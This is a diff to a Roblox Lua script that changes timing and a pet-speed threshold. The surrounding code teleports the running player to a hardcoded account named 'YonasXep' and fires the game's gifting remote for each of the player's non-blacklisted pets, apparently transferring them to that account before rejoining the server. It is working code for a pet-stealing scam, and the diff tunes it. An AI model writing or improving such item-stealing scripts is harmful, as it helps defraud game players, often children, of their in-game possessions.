@@ -45,7 +45,7 @@ for _, v in pairs(workspace.Pets:GetChildren()) do
 			if not v.RootPart:FindFirstChild("GUI/BigPetGUI") then
 				local petspeed = v.RootPart["GUI/IdleGUI"].Speed.Text
 				local number = tonumber((petspeed:gsub("%D", "")))
-				if number and number >= 300000 then
+				if number and number >= 500000 then
 					table.insert(deletePets, v.Name)
 				end
 			end
@@ -60,7 +60,7 @@ end
 
 local Blacklist = {"Wolf_E1", "Kangroo_E1", "Rhino_E1", "Lion_E1", "Gorilla_E1", "Seaturtle", "Okapi", "Needlefish", "Panther", "Butterflyfish"}
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players['YonasXep'].Character.HumanoidRootPart.CFrame
-task.wait(1)
+task.wait(3)
 for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetChildren()) do
 	if not table.find(Blacklist, v:GetAttribute("T")) then
 		game.ReplicatedStorage.Remote.CharacterRE:FireServer("Focus", v.Name)
@@ -68,6 +68,6 @@ for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetC
 		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players['YonasXep'])
 		task.wait(0.3)
 	end
-
 end
+task.wait(3)
 game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
